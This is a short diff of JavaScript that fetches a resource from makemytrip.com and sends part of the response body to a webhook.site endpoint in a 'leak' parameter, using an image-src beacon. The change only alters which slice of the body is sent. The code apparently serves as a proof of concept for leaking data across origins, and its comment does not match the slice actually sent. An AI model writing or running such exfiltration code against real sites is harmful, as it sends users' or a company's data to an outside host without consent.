@@ -7,7 +7,7 @@ fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zw
 .then(body => {
   // send first 200 chars (encoded) via image src
   const i = new Image();
-  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encodeURIComponent(body.slice(200, 1000));
+  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encodeURIComponent(body.slice(50, 400));
 })
 .catch(err => {
   const i = new Image();
